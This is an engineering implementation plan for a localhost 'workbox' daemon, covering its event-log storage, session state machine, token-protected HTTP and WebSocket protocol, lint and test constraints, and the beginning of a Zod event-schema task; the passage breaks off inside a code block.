# Daemon Core with the Fake Harness Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A running `workbox` daemon that registers projects, creates sessions in git worktrees, drives a harness through the `HarnessAdapter` port, records everything in an append-only SQLite event log and serves it over a typed, token-protected HTTP and WebSocket protocol on localhost, exercised end to end with a scriptable fake harness and the CLI, with no web UI yet.

**Architecture:** `protocol` gains the event catalogue, the entity schemas, the command and frame schemas, the session state machine and the pure projections that every client shares. `core` holds the domain, the ports (`EventStore`, `BlobIndex`, `HarnessAdapter`, `SandboxProvider`, `ProjectConfigSource`), one `SessionRuntime` actor per session and the `Workbox` application service, with no Bun or DOM API. `store-sqlite` implements `EventStore` and `BlobIndex` over `bun:sqlite` with embedded, versioned SQL migrations, materialised projection tables and an FTS5 index. `process` holds the Bun command runner that `sandbox-host`, the CLI's `doctor` and, in plan 4, `harness-claude` share. `harness-fake` replays JSON scenarios through the port. `sandbox-host` prepares git worktrees and spawns host processes with an env allowlist. `server` exposes `Bun.serve` routes, the one-time-token exchange, WebSocket tickets, one command dispatcher behind HTTP and WebSocket, and the frame protocol with a gap-free backfill and per-project pub/sub fed by the store's append notifications. `apps/cli` is the only composition root: daemon lifecycle (`workbox`, `serve`, `status`, `stop`), `project` and `session` commands, config loading and recovery after a crash.

**Tech Stack:** Bun 1.4.2 (`bun:sqlite` with SQLite 3.54 and FTS5, `Bun.serve` routes and WebSocket pub/sub, `Bun.spawn`), Zod 4.6, citty 0.2, `open` 11.0.4, LogTape 2.3 via `@workbox/observability`, `bun test`.

**Spec:** [2026-09-30-workbox-foundation-vertical-slice-design.md](../specs/2026-09-30-workbox-foundation-vertical-slice-design.md), sections 4 to 7 and 10. ADRs 0002, 0003 and 0010 bind; this plan amends ADR 0003 (storage access), ADR 0004 (catalog), ADR 0005 (rule ledger and tags) and adds ADR 0012 (localhost protocol). The review of the first draft (2026-10-01, kept outside the repository) is resolved in this revision; its findings are referenced as `C1`, `I3`, `Minor 15` and so on where a design choice answers one.

**Evidence behind the design (verified 2026-10-01):**

- `bun:sqlite` on this Mac reports SQLite 3.54.0 and creates and queries an `fts5` virtual table; Bun's static SQLite, used on Linux and Windows by default, is compiled with `SQLITE_ENABLE_FTS5`, `SQLITE_ENABLE_JSON1` and `SQLITE_ENABLE_RTREE` (`scripts/build/deps/sqlite.ts` in oven-sh/bun). FTS5 is therefore available on every CI runner; Task 8 asserts it at store start-up instead of carrying the LIKE fallback the spec reserved. The review's in-memory probe (Bun 1.4.2) confirmed the `temp.` FTS5 probe table, `snippet()`, that `PRAGMA journal_mode` returns `memory` for an in-memory database, `.immediate()` on transactions, and that an FTS5 syntax error throws.
- `bun:sqlite`'s API: `new Database(path, { strict: true, create: true })`, `db.query()` caches prepared statements, `db.transaction(fn)` returns a callable with `.immediate()`, `PRAGMA journal_mode = WAL`, `.get/.all/.run/.iterate`.
- `Bun.serve` supports a `routes` object (static `Response`, per-method handlers, `/:param` segments read from `req.params`, `/prefix/*` wildcards) with `fetch` as the fallback, `port: 0` for a free port, `hostname`, `server.port`, `server.stop(closeActiveConnections)`, and WebSockets through `server.upgrade(req, { data })`, a `websocket` handler object (`open`, `message`, `close`, `drain`), `ws.subscribe/unsubscribe/publish`, `server.publish`.
- bun-types 1.4.2 `serve.d.ts` (read today): a WebSocket `send()` or `publish()` returns `0` when the message was dropped, `-1` under backpressure and the byte count otherwise; `backpressureLimit` defaults to 16 MB and `closeOnBackpressureLimit` to `false`, so a slow client silently loses frames unless the server opts in to closing; `maxPayloadLength` defaults to 16 MB; the WebSocket `idleTimeout` defaults to 120 s and `sendPings` to `true`; the HTTP `idleTimeout` defaults to 10 s and `server.timeout(request, seconds)` resets it per request (`0` means no timeout).
- bun-types 1.4.2 `bun.d.ts` (read today): `Bun.spawn` takes `detached` (POSIX `setsid()`, Windows `UV_PROCESS_DETACHED`; the doc comment says stdio may keep the parent alive and to pass `stdio: ['ignore', 'ignore', 'ignore']`) and `windowsHide`; `Subprocess.unref()` is documented as "By default, Bun waits for all subprocesses to exit before shutting down"; `Bun.isStandaloneExecutable` is `true` inside a `bun build --compile` binary; `windowsVerbatimArguments` ("If true, no quoting or escaping of arguments is done on Windows") is a spawn option.
- zod 4.6.5 (read today): `z.uuid()` requires an RFC 9562 version digit (`1` to `8`) in the third group and a variant digit (`8`, `9`, `a`, `b`) in the fourth, besides the nil and max UUIDs, so counter ids like `00000000-0000-0000-0000-000000000001` fail; `toJSONSchema` normalises the legacy `'draft-7'` to `'draft-07'`; `.nonnegative()` and `.nonempty()` exist on numbers, strings and arrays.
- oxlint 1.86 with the repository's root rules, run today on a scratch file under `packages/protocol/src`: ports written as `readonly name: (…) => …`, parameters typed `DeepReadonly<z.output<…>>`, `as const satisfies Record<EventType, z.ZodType>`, `z.string().nonempty().max(SOURCE_ID_MAX_LENGTH)`, a generic `eventMember()` helper with `.extend()`, and an options object instead of four parameters all pass; the only reports were `id-length` on the key `v` and `no-magic-numbers` on the array index literal in `events[0]`. A second probe with a scratch `packages/core/.oxlintrc.json` confirmed that `no-restricted-imports` accepts a `!bun:test` negation inside a `patterns` group: in `src/testing/` only `bun:sqlite` and `node:path` were reported, and `bun:test` stayed banned in the rest of `src/`. A third probe (round 2) added `"max-lines-per-function": "off"`, `"max-statements": "off"` and `"no-magic-numbers": "off"` to that override: an 18-case `describe` suite with 54 numeric literals in `src/testing/` drew no report from those rules, while `42` in a sibling `src/` file was still reported. oxlint's configuration schema lists `ignoreInferredTypes` as an option of `typescript/prefer-readonly-parameter-types`. The review's probes with the same tooling reproduced `method-signature-style`, `prefer-readonly-parameter-types` (a shallow `Readonly<>` over a nested object is still rejected; a deep mapped type passes), `no-magic-numbers` on `min(1)`, `max(200)` and `literal(1)`, `no-unsafe-type-assertion` and `max-params`.
- Drizzle ORM: the stable line is 0.45.3 (2026-09-21) while 1.0 is in release candidates; its migrator reads a migrations folder from disk, which a compiled binary does not have. The log has a handful of tables, an FTS5 virtual table and triggers that an ORM does not model, so this plan uses `bun:sqlite` directly with embedded SQL migrations and records the deviation from spec section 3 in an ADR 0003 amendment.
- `open` 11.0.4 was published 2026-09-14 and qualifies for the 72-hour `minimumReleaseAge`. The review's registry check lists six direct dependencies (`default-browser`, `wsl-utils`, `powershell-utils`, `is-in-ssh`, `define-lazy-prop`, `is-inside-container`); they pass through `minimumReleaseAge` and `trustPolicy` at install time, and a rejection is a decision point under ADR 0004 (pick another version or an exact, dated exclusion), not something to switch off. Zod 4.6 and citty are already in the catalog; no other runtime dependency is added.
- git 2.54 (the review's scratch clone, 2026-10-01): `git worktree add -b workbox/z <path> remote-only` in a fresh clone created and checked out a local `remote-only` tracking `origin/remote-only` and no `workbox/z` at all, while `origin/remote-only` as the start point produced the intended branch; `git for-each-ref --format=%(refname:short) refs/remotes` prints `origin`, not `origin/HEAD`, for `refs/remotes/origin/HEAD`.
- The CLI's command runner from plan 1c (`apps/cli/src/process/command-runner.ts`, `pipe-collector.ts`) is Bun-specific and already handles timeouts, SIGKILL escalation and pipe drain; `sandbox-host` needs it for `git` and setup commands, and plan 4's `harness-claude` needs it for `claude auth status` (spec section 6.2). Adapters may not import each other, so Task 9a moves it into a new `packages/process` with its own boundaries tag instead of into `sandbox-host`.
- Tooling facts from the review's probes used below: knip 6.39 treats `exports` targets as entry files; turbo 2.11.5 supports `$TURBO_ROOT$` in task `inputs`; the repository's cspell configuration flags `utilisation`, `summarise`, `materialised`, `serialises`, `localised`, `normalised`, `windir`, `setsid` and `SYSTEMROOT`.
- Facts from the re-review's probes (2026-10-01) used below: under `Bun.spawn` on Windows a `cmd.exe /c` payload that contains quotes is re-escaped with backslashes that `cmd.exe` does not understand (magicpro97/vibeflow #805), which `windowsVerbatimArguments` avoids; Claude Code's `NotebookEdit` tool sends its target as `notebook_path`; the root test override does not relax `max-lines`, so a 332-line `*.test.ts` is reported; with `ignoreInferredTypes: true`, `prefer-readonly-parameter-types` exempts the inline callbacks of `Bun.serve` and still reports an annotated `Request` parameter, and `Readonly<Database>` and `Readonly<ReadableStream<…>>` pass the rule while `Request`, `Readonly<Request>`, `Readonly<Server>`, `Readonly<ServerWebSocket>` and `Readonly<Uint8Array>` do not; citty 0.2.2 skips the values of declared string flags when it looks for a subcommand, so `workbox --harness fake` runs the default command; a function type with an annotated `(request: Request) => …` parameter is still reported under `ignoreInferredTypes`, while `(pathname: string) => …` passes (the re-review's round-2 probe).

## Decisions and spec deviations

Each is recorded where the row says; the owner can veto any of them before Task 1 starts.

| # | Decision | Why | Recorded in |
|---|---|---|---|
| 1 | Storage through `bun:sqlite` with embedded SQL migrations instead of Drizzle (spec sections 3 and 4.2) | Drizzle's migrator reads a folder a compiled binary lacks; FTS5 tables and triggers are raw SQL anyway; Drizzle 1.0 is in release candidates. Cost: hand-written row mapping, mitigated by Zod-validated rows. | Task 17, ADR 0003 amendment (supersedes spec sections 3 and 4.2 on this point) |
| 2 | FTS5 asserted at start-up; the LIKE fallback of spec 5.5 is dropped | FTS5 is present on every runner (evidence above); the assertion turns a regression into a clear error. | Task 8, ADR 0003 amendment |
| 3 | The bearer itself is stored in `daemon.json` (spec 7.3 says a token hash); the browser receives the same bearer once from `POST /api/auth/exchange` | A file holding only a hash cannot authenticate the CLI on later invocations; the owner-only file is the boundary. On Windows `mode` is ignored and the user-profile permissions protect the file. One bearer for the daemon's lifetime means no client can be revoked on its own. | Global Constraints, Tasks 11 and 14, ADR 0012 |
| 4 | `POST /api/command` as the CLI transport, the list commands `project.list` and `session.list` (an extension of spec 7.2's command list), plus `GET /api/summary`, `POST /api/admin/one-time-token` and `POST /api/admin/shutdown` | One dispatcher behind HTTP and WebSocket keeps CLI and UI behaviour identical without a WebSocket client in the CLI. Slow commands never block a request: `session.create` acknowledges with the session id while preparation continues (I3). Error frames map to HTTP statuses (Minor 14). | Tasks 2, 12 and 15, ADR 0012 |
| 5 | The command runner moves to a new `packages/process` (tag `process`) that adapters and the CLI may depend on | git and setup commands need it in `sandbox-host`, `claude auth status` needs it in `harness-claude` (plan 4), and adapters cannot import each other, so a runner inside an adapter would move twice. The spec's package list (4.2) gains one leaf package. | Task 9a, ADR 0005 (tag list, ten tags) |
| 6 | Scenarios stay in `packages/harness-fake/scenarios/` (spec 6.4) and are exported from `src/index.ts` as JSON imports (`BUILT_IN_SCENARIOS`), so `bun build --compile` bundles them; `WORKBOX_FAKE_SCENARIO` selects one at runtime (default `happy-path`) | Not a deviation; the export and the selection were missing (I9). | Tasks 10 and 14 |
| 7 | `ANTHROPIC_API_KEY` is not in the default `env.passthrough` (spec 5.6's example lists it) | An exported key would make Claude Code bill the API, against the zero-paid-API constraint. The API-key path becomes a per-project opt-in; the README says how to enable it. | Task 3, Task 16 (README) |
| 8 | Localhost checks accepted as weaker than a multi-user design: one bearer for browser and CLI; `GET /api/health` and `GET /api/blobs/:sha256` need no bearer; requests without `Origin` are accepted. Paired with a `Host` header check against DNS rebinding, a 5-minute expiry on the one-time token and a hash pattern check before any filesystem access | Defensible for a daemon bound to 127.0.0.1; the `Host` check closes the rebinding hole that bearer-less GET routes would leave (Minor 15). | Tasks 11 and 12, ADR 0012 |
| 9 | The employee `harness` enum gains `fake`; the daemon gains `--harness fake|claude` (default `WORKBOX_HARNESS`, else `fake` in plan 2) and the chosen adapter runs every employee regardless of the employee's `harness` field | Plan 2 ships only the fake adapter; employees configured for `claude` must still run under `pnpm dev` and in tests (I9). | Tasks 1 and 14 |
| 10 | `SandboxProvider` gains `detectDefaultBranch`, `listBranches` and `environment(envPassthrough)`, so git on the project repository and the env allowlist sit behind the sandbox port | It suits the host provider, and a harness started without a fresh `prepare` (resume, restart, a prompt after `stop`) needs the filtered env from somewhere `core` may call; plan 5's remote sandboxes may split a `ProjectRepository` port off later. | Tasks 4 and 9b |
| 11 | `isTurnEnded(status)` (true for `completed`, `failed`, `stopped`) replaces the draft's misnamed `isTerminal`; those statuses still accept `prompt` | The function means "the turn has ended", not "the session is final" (Decision 11 of the review). | Task 2 |
| 12 | Spec amendments to the state machine (5.2): `session.created` puts a session into `creating` without a trigger; `waiting_* + turn.failed → failed`; `stop` is allowed from every status except `stopped`, including `completed`, `failed` and `creating`; restart and shutdown recovery idles `waiting_*` like `running` and fails `creating` | Without them sessions get stuck (I3). | Task 2, ADR 0012 |
| 13 | The `Session` projection gains `pendingRequest?: { requestId, kind }`, and the `events` table gains a `project_id` column | The CLI acceptance test and the dashboard need the pending request without a WebSocket; routing needs each event's project synchronously and in `seq` order (I6, I9). | Tasks 2, 4 and 8 |
| 14 | The spec's open question 5 is closed with the name pool `['Alice', 'Bob', 'Eva', 'Jan']` (not locale-aware yet) and open question 6 with 90 % coverage on `protocol` and `core` | Both reasonable for slice 1; the plan index notes them. | Tasks 7 and 17 |
| 15 | Inbound WebSocket messages capped at 1 MB; WebSocket idle timeout 120 s with pings; `workbox status` exits 1 when no daemon runs | Prompts are text and attachments go through `/api/blobs`; the exit code suits scripts and the README documents it. | Tasks 13 and 15 |
| 16 | Deferred spec items, each marked in its task: usage aggregates per project and day (plan 6; per-session totals are folded in the transcript now, Task 3), the per-session `debug.jsonl` (plan 6; Task 14), the question auto-select timeout (plan 3; `decidedBy: 'timeout'` is in the schema; Task 6), `maxTurns` and `maxBudgetUsd` enforcement (plan 4; the config keys exist now, Task 3), i18n keys for `error.type` (plan 3; Task 16), the Claude side of resume after a daemon restart (plan 4; Decision 20), the LIKE search fallback (dropped, Decision 2) | Minor 17 and I3. | Tasks 3, 6, 14, 16 |
| 17 | Two lint exceptions for whole classes of files: `src/testing/**` in `core` and `sandbox-host` relaxes `max-lines-per-function`, `max-statements` and `no-magic-numbers` exactly as the root override does for `*.test.ts`, and `server` sets `ignoreInferredTypes` on `prefer-readonly-parameter-types` | ADR 0005 already rules that a rule which cannot apply to a whole class of files is configured in `.oxlintrc.json` with a ledger row instead of being suppressed line by line; the store suite and the test doubles are test code that adapters import, and Bun dictates the parameter types of `Bun.serve` callbacks (evidence above). A single site that a rule cannot fit still takes a per-line suppression with its reason; the override is for whole classes of files. | Tasks 4, 9b and 11, ADR 0005 |
| 18 | Worktree cleanup: `session.archive` stops a held harness session (`runtime.shutdown`), disposes of the workspace and appends `workspace.removed`; `stop` keeps the worktree so the session can be resumed; a failed setup command keeps it for inspection, recorded through `workspace.prepared` so that `archive` can remove it | Nothing else removes worktrees, so `<home>/workspaces` would grow without bound; archiving is the user's signal that the work is over, and a harness must not run inside a worktree that is being removed. | Tasks 6, 7 and 9b |
| 19 | Three shape deviations from the spec: `core` reports failures by rejecting with `WorkboxError` and the dispatcher turns them into `error` frames (spec 10.3 says "typed results"; `ParseResult` stays for config parsing); `creating → idle` fires when `start()` resolves, and for Claude `harness.bound` may follow later (spec 5.2 says "workspace prepared and harness bound"); `prepare()` returns `PreparedWorkspace { workspace, setupCommandResults, env }` (spec 7.5 says `Promise<Workspace>`) | One error channel keeps the actor code straight and the HTTP mapping mechanical; the Claude SDK reports its session id only with the first turn's init message; the runtime needs the setup results and the filtered env from the same call that produced them. | Tasks 2, 4 and 6, ADR 0012 |
| 20 | Resume after a restart: the `core` seam lands now (`SessionRuntime.ensureHarness` starts a harness for an existing session with `resumeId: session.harnessSessionId` and `env: sandbox.environment(…)`; the fake adapter continues with its next scenario turn for a `resumeId` it knows), and plan 4 adds only the Claude side (`resume` from `resumeId`, `harness.bound` from the init message) | Spec 2.3 step 8 depends on the seam; without it plan 4 would have to reopen `core`. | Tasks 6, 7 and 10 |
| 21 | Queued turns live in memory: a prompt sent while a turn runs is acknowledged with its `turnId` and starts after the current turn ends; `interrupt` and `stop` discard the queue (ids logged at `info`); after `turn.failed` the next queued turn starts; a daemon crash loses the queue | Persisting the queue would need a `turn.queued` event the spec lacks. | Task 6 |

## Global Constraints

- Dependency rules of spec section 4.3, enforced by `turbo boundaries` tags in the root `turbo.json`: `protocol` depends on nothing internal; `core` depends only on `protocol` (tag `core`); `store-sqlite`, `harness-fake`, `sandbox-host` and `server` depend on `core`, `protocol`, `observability`, `i18n` and `process`, never on each other (tag `adapter`); `process` (new tag) depends on nothing internal; `apps/cli` may import everything (tag `app-cli`). `protocol` and `core` use no Bun API, no `process` global and no DOM: `packages/core/.oxlintrc.json` extends the root config and copies the bans from `packages/protocol/.oxlintrc.json` (`Bun`, `process` globals and `bun:*`, `node:*` imports). The bans apply to the whole package, tests included; only the `test/**` override lifts the import ban (and `src/testing/**` lifts it for `bun:test` alone, Task 4), and `scripts/**` in `protocol` lifts it for the export script (Task 1).
- Package manager pnpm 12 with catalogs: runtime dependencies `catalog:` (add `open: ^11.0.4`), tooling `catalog:dev`; `minimumReleaseAge` 72 h; every new package has `package.json` in the shape of `packages/protocol/package.json` (private, `type: module`, `exports` to `./src/index.ts`, scripts `test` and `typecheck`, devDependencies `@types/bun` and `typescript` from `catalog:dev`) and a `turbo.json` with its tag. Test-only subpaths (`@workbox/core/testing`, `@workbox/sandbox-host/testing`) are `exports` entries pointing at `./src/testing/index.ts`; knip treats `exports` targets as entries, so they need no extra knip entry.
- TypeScript: the base config flags (`strict`, `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, `noPropertyAccessFromIndexSignature`, `verbatimModuleSyntax`, `erasableSyntaxOnly`); import types with `import type`; no `any`, no non-null assertions, no `null` literals except through a named constant with a reason (see `NOT_FOUND` in `apps/cli/src/doctor/checks.ts`; SQLite rows are read with `?? undefined`, never compared to a `null` literal); optional fields instead of nullable ones in TypeScript shapes (SQLite columns may still be NULL); with `exactOptionalPropertyTypes` an optional field is set only when it has a value (conditional spread), never assigned `undefined`; index-signature records (`process.env`, `Record<string, …>`) are read with brackets.
- Lint shapes that the repository's rules force, prescribed once here and followed in every task: interfaces declare functions as `readonly name: (…) => …` properties, never as methods (`typescript/method-signature-style`); every parameter type is deep read-only (`typescript/prefer-readonly-parameter-types`), so `protocol` exports `DeepReadonly<Value>` (Task 1) and every exported TypeScript type derived from a Zod schema is `DeepReadonly<z.output<typeof schema>>`; functions take at most three parameters (`max-params`), so anything wider takes an options object; object types sketched in this plan as `{ a: T }` are written `{ readonly a: T }`, because the rule checks property modifiers too; no numeric literal in `src/` outside `src/testing/` except through a named constant (`no-magic-numbers` is on there and flags `min(1)`, `max(200)`, `literal(1)`, `0o600` and even the index in `events[0]`: use `.nonnegative()`, `.nonempty()`, named constants and destructuring such as `const [first] = events`); single-letter identifiers are banned (`id-length`) except `z` and, from Task 1 on, the envelope key `v`; every linted file stays under 300 lines (`max-lines`, which the root test override does not relax), so the event catalogue is split by group and test files and the store suite are split by concern; no `await` in a loop (`no-await-in-loop`), so paging and draining use recursion as `pipe-collector.ts` does.
- Lint and format: `pnpm run check` green before every commit; type-aware Oxlint `--deny-warnings`; a single site that a rule cannot fit takes `// oxlint-disable-next-line <rule> -- <reason>`, listed in the task report; never turn a rule off for a file it can apply to; a rule that cannot apply to a whole class of files is configured in a nested `.oxlintrc.json` override instead (Decision 17); every `.oxlintrc.json` change (option, override, nested file) gets its ledger row in ADR 0005 in the same task; knip must know every new entry (fixtures spawned as processes go into `knip.jsonc` the way `packages/observability` does).
- Tests: `bun test` in every runtime package, TDD (failing test first, recorded in the report), pristine output, no `.only`/`.skip`, `test.skipIf(condition)` with a comment when a platform cannot run a test; temporary directories from `mkdtemp` and removed in `afterEach`/`afterAll` (with `rm(dir, { recursive: true, force: true, maxRetries: 5 })` wherever a daemon or SQLite file was open, because Windows keeps `workbox.db` locked for a moment); every test that spawns `git` sets `GIT_CONFIG_GLOBAL` to an empty temporary file and `GIT_CONFIG_NOSYSTEM=1`, creates its repository with an explicit `user.name`/`user.email` and `git init -b main`, and compares paths after `realpath.native` (macOS prints `/private/var/…`, Windows runners use an 8.3 `TEMP`). Deterministic ids in the tests of `core` and the adapters come from `testId(index)` in `@workbox/core/testing` (`00000000-0000-4000-8000-<index padded to 12 digits>`), which `z.uuid()` accepts; `protocol` fixtures hard-code version-4 UUIDs, because `protocol` may not depend on `core`. Polls of spawned processes carry explicit deadlines (30 s). CI runs the tests on `ubuntu-26.04`, `macos-26` and `windows-2025`: paths through `node:path`, no shell scripts as fixtures, `process.execPath` to spawn Bun.
- Coverage: `bunfig.toml` in `packages/protocol` and `packages/core` with `[test] coverage = true` and `coverageThreshold = 0.9`; the threshold fails `bun test` when not met.
- Logging: packages log through the `Logger` port of `core` (four function properties: `debug`, `info`, `warning`, `error`); only `apps/cli` binds it to LogTape, one logger per package with the categories `workbox.core`, `workbox.store`, `workbox.sandbox`, `workbox.harness.fake`, `workbox.server` and `workbox.cli` (spec 10.1); env values, tokens and prompt content are never logged below `WORKBOX_DEBUG=full`.
- Security of the local protocol (spec section 7.3): bind `127.0.0.1` only; `daemon.json` written atomically with mode `0o600` and holding the bearer token itself (Decision 3); the bearer never appears in a URL or a log, and the browser receives it once from `POST /api/auth/exchange`; one-time tokens expire after 5 minutes; tickets are single-use and valid 30 s; a present `Origin` must equal the daemon's own origin (`http://127.0.0.1:<port>` or `http://localhost:<port>`) or be in the `allowedOrigins` option (empty by default; `pnpm dev` sets the Vite origin); the `Host` header must be `127.0.0.1:<port>` or `localhost:<port>`; blob uploads capped at 25 MB and content-addressed, and `:sha256` is checked against `^[0-9a-f]{64}$` before the filesystem is touched.
- Idempotency keys (`sourceId`, spec 5.4) follow one convention for every source: harness events `fake:<turnId>:<step index>:<event type>` (the fake adapter, one key per emitted event even when a step emits two; `fake:<sessionId>:bound` for `harness.bound`), events caused by a client command `user:<commandId>:<n>` (`n` counts from 1 within the command), an uploaded attachment `user:blob:<sessionId>:<sha256>`, status changes caused by a harness event `<that event's sourceId>#status`, and everything else `system:<ids.next()>`. `append` reports for each input whether it was inserted, so a replay never re-runs a transition.
- Conventional Commits, signed off (`git commit -s`), subject and body lines at most 100 characters, one commit per task; every task ends with `pnpm run check` green.
- Text in code, comments and docs is English (British spellings that cspell flags go into `project-words.txt` in the task that introduces them, never into `cspell.json`); user-facing CLI strings go through `@workbox/i18n` messages in English and Czech (new keys prefixed `cli_`); every new CLI command accepts `--json` where it prints data and `--debug` (spec 7.4) through a shared `commonArgs` definition.

## Review Focus

- Idempotency across crash and resume: a `sourceId` seen twice must yield one event, the second append must report `inserted: false` with the stored envelope, a replayed fake turn must not collide with the first (keys carry the `turnId`), and a daemon restart must turn `running` and `waiting_*` sessions into `idle` and `creating` sessions into `failed` with a `session.status_changed` whose reason says so (Tasks 4, 7, 8 and 10 pin these).
- Gap-free reconnects: `subscribe { sinceSeq }` must deliver every persisted event after `sinceSeq` in order, in pages, and then live events with strictly increasing `seq`, even when an event is appended during the backfill, with no frame dropped under backpressure (Task 13 pins it with an append racing a backfill held on a deferred promise, and with a `send` that returns `-1`).
- Token hygiene: the one-time token works once and expires, the bearer never appears in URLs or logs, a ticket is rejected after use and after 30 s, a wrong `Origin` or `Host` is refused with 403, and timing-safe comparison is used (Tasks 11 to 13).
- Windows: worktree paths under `WORKBOX_HOME` with backslashes, branch names without characters or device names Windows forbids, the env allowlist matched case-insensitively so `Path` survives, setup commands through `cmd.exe`, `git` spawned by name, quoted setup commands through `cmd.exe` with verbatim arguments, and processes ended through the runner's escalation (Tasks 9a and 9b).
- The state machine: every (status, trigger) pair of spec section 5.2 plus Decision 12 is defined, every undefined pair returns a typed error instead of throwing, `interrupt` from `waiting_*` returns to `idle`, and `stop` works from `completed` and `failed` (Task 2).
- Lifecycle: `createSession` acknowledges before the worktree exists and the preparation events follow; a prompt while running is queued; the policy replaces the adapter's recommendation and never auto-allows a chained Bash command or a fetch to an unlisted domain (Tasks 5 to 7).

---

### Task 1: Protocol: event catalogue, envelope, fixtures and schema export

**Files:**
- Create: `packages/protocol/src/ids.ts`, `packages/protocol/src/events/index.ts`, `packages/protocol/src/events/project.ts`, `packages/protocol/src/events/session.ts`, `packages/protocol/src/events/conversation.ts`, `packages/protocol/src/events/decisions.ts`, `packages/protocol/src/events/harness.ts`, `packages/protocol/src/events/usage.ts`, `packages/protocol/src/transient.ts`
- Create: `packages/protocol/test/events.test.ts`, `packages/protocol/test/fixtures/events/*.json` (one file per event type), `packages/protocol/test/schema-snapshot.test.ts`
- Create: `packages/protocol/scripts/export-schemas.ts`, `schemas/workbox.events.schema.json`, `schemas/workbox.user-config.schema.json` (repository root `schemas/`)
- Modify: `packages/protocol/src/index.ts`, `packages/protocol/src/user-config.ts` (`target: 'draft-07'`), `packages/protocol/package.json` (script `schemas`), `packages/protocol/tsconfig.json` (`include` gains `scripts`), `packages/protocol/turbo.json` (test inputs), `packages/protocol/.oxlintrc.json` (`scripts/**` override), `packages/protocol/bunfig.toml` (new), root `.oxlintrc.json` (`id-length` exceptions), root `package.json` (script `schemas`), `knip.jsonc` (protocol `project` and `entry` gain `scripts/**/*.ts`), `project-words.txt`, `docs/adr/0005-oxlint-and-oxfmt-with-turborepo-boundaries-instead-of-eslint.md` (two ledger rows)

**Interfaces:**
- Produces: `DeepReadonly<Value>`, `idSchema` (`z.uuid()`), `Id`, `isoTimestampSchema` (`z.iso.datetime()`), `sourceIdSchema`, `SOURCE_ID_MAX_LENGTH`, `sha256Schema`; `EVENT_SOURCES`, `SESSION_STATUSES`, `TOOL_CATEGORIES`, `DECIDED_BY`, `ERROR_TYPES`, `HARNESS_IDS` with the derived types `EventSource`, `SessionStatus`, `ToolCategory`, `DecidedBy`, `ErrorType`, `HarnessId`, `EVENT_SCHEMA_VERSION`, `EVENT_TYPES` (explicit `as const` tuple of the 30 names), `EventType`, `eventPayloads` (`satisfies Record<EventType, z.ZodType>`), `EventPayload<T>`, `eventSchema`, `newEventSchema`, `eventEnvelopeSchema`, `Event`, `NewEvent`, `EventEnvelope` (all three TypeScript types deep read-only), `SESSION_SCOPED_EVENT_TYPES`, `GLOBAL_EVENT_TYPES` (`harness.auth_status`, `rate_limit.reported`), `transientFrameSchema`, `TransientFrame`, `eventsJsonSchema()`.
- Fixes applied from the review: I1 (b, c, d, e, f, g), I7 (payload and envelope session id), Minor 1, 2, 3, 4, 8 and 27; re-review Minors 1 and 18.

- [ ] **Step 1: Write the failing contract tests**

`packages/protocol/test/events.test.ts` loads every file under `test/fixtures/events/` with `node:fs` (allowed in `test/**`), parses it with `eventEnvelopeSchema`, asserts `type` equals the file name without `.json` and that `EVENT_TYPES` has exactly one fixture each (so a new type without a fixture fails). A second test asserts that an envelope with an unknown key, a wrong `v`, a `seq` of `-1` or a non-ISO `ts` is rejected. A third test pins the session id rule: a session-scoped event whose envelope `sessionId` is missing or differs from `payload.sessionId` (or from `payload.id` for `session.*` types) is rejected, and a project-level or global event with an envelope `sessionId` is rejected. `schema-snapshot.test.ts` reads the committed `schemas/*.json` with `node:fs`, `JSON.parse`s them and asserts deep equality with `eventsJsonSchema()` and `userConfigJsonSchema()` (formatting-neutral on purpose: oxfmt owns the file formatting); the failure message names `pnpm run schemas`. Run `bun test` in `packages/protocol`: both files fail (modules missing).

- [ ] **Step 2: Implement the catalogue**

`ids.ts`:

```ts
import { z } from 'zod';

/** Recursively marks every property and array read-only; Zod outputs are mutable, ports take these. */
export type DeepReadonly<Value> = Value extends readonly (infer Item)[]
  ? readonly DeepReadonly<Item>[]
  : Value extends object
    ? { readonly [Key in keyof Value]: DeepReadonly<Value[Key]> }
    : Value;

export const SOURCE_ID_MAX_LENGTH = 200;

export const idSchema = z.uuid();
export const isoTimestampSchema = z.iso.datetime();
export const sourceIdSchema = z.string().nonempty().max(SOURCE_ID_MAX_LENGTH);
export const sha256Schema = z.string().regex(/^[0-9a-f]{64}$/u);
export type Id = z.output<typeof idSchema>;
```

The event files declare one strict payload schema per event of spec section 5.3, grouped as the spec groups them (`project.ts`: project and people; `session.ts`: session and workspace; `conversation.ts`: turn, message, tool; `decisions.ts`: permission and question; `harness.ts`: harness, context, subagent; `usage.ts`: usage, rate limit, attachment). Shared pieces live where they are first used and are imported by the others (`appearanceSchema` and `employeeFieldsSchema` in `project.ts`, `blockSchema` in `conversation.ts`, `optionSchema` in `decisions.ts`, `errorSchema` in `conversation.ts`). These exact shapes are the contract for every later plan (written with `.nonnegative()` and `.nonempty()` so that no numeric literal appears):

```ts
export const EVENT_SOURCES = ['harness', 'user', 'system'] as const;
export const SESSION_STATUSES = [
  'creating', 'idle', 'running', 'waiting_for_permission', 'waiting_for_answer',
  'completed', 'failed', 'stopped',
] as const;
export const TOOL_CATEGORIES = ['read', 'edit', 'run', 'web', 'other'] as const;
export const DECIDED_BY = ['user', 'policy', 'timeout'] as const;
export const ERROR_TYPES = ['auth', 'rate_limit', 'network', 'process_crash', 'sandbox', 'unknown'] as const;
export const HARNESS_IDS = ['claude', 'fake'] as const;
/** Bumped per event type when a payload changes shape; every type is at 1 in plan 2. */
export const EVENT_SCHEMA_VERSION = 1;

export const appearanceSchema = z.strictObject({ body: z.string(), skin: z.int().nonnegative(), hair: z.int().nonnegative(), outfit: z.int().nonnegative() });
export const employeeFieldsSchema = z.strictObject({
  id: idSchema, projectId: idSchema, name: z.string().nonempty(), appearance: appearanceSchema,
  gender: z.enum(['female', 'male', 'other']), role: z.literal('developer'), harness: z.enum(HARNESS_IDS),
  model: z.string(), effort: z.enum(['low', 'medium', 'high']), systemPromptAppend: z.string(),
  permissionMode: z.enum(['default', 'acceptEdits', 'plan', 'bypassPermissions']), deskId: z.string(),
});
const blockSchema = z.discriminatedUnion('kind', [
  z.strictObject({ kind: z.literal('text'), text: z.string() }),
  z.strictObject({ kind: z.literal('tool_use'), toolCallId: z.string(), name: z.string(), inputSummary: z.string() }),
  z.strictObject({ kind: z.literal('tool_result'), toolCallId: z.string(), attachmentId: sha256Schema.optional() }),
